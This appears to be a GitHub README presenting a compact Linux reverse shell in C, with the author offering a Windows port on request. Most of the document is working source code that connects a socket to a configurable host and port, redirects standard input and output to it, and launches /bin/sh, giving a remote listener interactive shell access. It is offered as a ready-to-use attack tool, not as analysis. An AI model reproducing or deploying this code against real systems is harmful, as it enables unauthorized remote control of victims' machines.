# compact_linux_reverse_shell
A compact linux reverse shell written in the C programming language.

`note I haven't bothered yet to implement this in windows; if someone wants that open a issue(no need to pull) and tell me that; or request it via discord; and it should get done in a few days`

obviously you can do a pull if thats what you want :)


https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597
```
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#define RP 1234
#define RH "127.0.0.1"
#define BIN "/bin/sh"
int main(){
int is = 0;is = socket(AF_INET,SOCK_STREAM,0);
struct  sockaddr_in s1;
s1.sin_family      = AF_INET;
s1.sin_port        = htons(RP);
s1.sin_addr.s_addr = inet_addr(RH);
connect( is,(struct sockaddr *) &s1,sizeof(s1));
for(int i=0;i<3;dup2(is,i),i++);
char * const argv[] = {BIN,NULL};
execve(BIN, argv, NULL);
return 0;}
```
